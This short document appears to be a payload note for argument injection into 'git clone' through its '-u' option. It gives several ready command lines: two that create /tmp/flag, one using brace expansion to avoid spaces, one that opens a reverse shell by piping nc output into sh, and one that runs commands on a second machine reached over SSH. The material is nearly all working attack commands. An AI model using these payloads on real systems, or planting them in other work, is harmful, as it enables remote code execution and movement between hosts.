
```
git clone -u 'touch /tmp/flag #' file://etc/hosts
```

```
git clone file://etc/hosts "-u{touch,/tmp/flag};#"
```


```
git clone file://etc/hosts "-u{nc,127.0.0.1,8000}|sh|{nc,127.0.0.1,8000}>/dev/null;#"
```

If the victim machine has SSH access to another machine (e.g. `victim-2`),
the `-u` flag of `git clone` allows an attacker to specify arbitrary commands
to be run on that `victim-2` host.
```
git clone -u 'touch /tmp/flag #' ssh://victim-2/
```
